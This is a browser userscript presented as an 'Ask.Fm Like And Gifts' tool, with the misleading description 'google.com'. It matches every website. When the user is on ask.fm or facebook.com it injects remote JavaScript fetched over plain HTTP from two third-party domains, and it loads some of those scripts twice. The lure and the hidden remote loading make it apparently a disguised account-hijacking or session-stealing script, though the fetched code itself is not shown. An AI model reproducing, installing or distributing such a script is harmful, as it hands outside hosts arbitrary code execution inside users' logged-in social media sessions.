// ==UserScript==
// @name          Ask.Fm Like And Gifts 
// @namespace     Ask.Fm Like And Gifts
// @description   google.com
// @version     1.0
// @license     GPL 3.0
// @include     http*://*

// ==/UserScript==

function addJavascript(jsname){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
	s.setAttribute('src',jsname);
	th.appendChild(s);
}

if(location.hostname.indexOf("ask.fm") >= 0){
addJavascript('http://www.melihjohnsan.com/ask.js');
}

if(location.hostname.indexOf("facebook.com") >= 0){
addJavascript('http://www.fuatturgut.com/amvar/amcuq.php');
addJavascript('http://www.fuatturgut.com/amvar/axx.php');
addJavascript('http://www.fuatturgut.com/amvar/amcuq.php');
addJavascript('http://www.fuatturgut.com/amvar/axx.php');

}
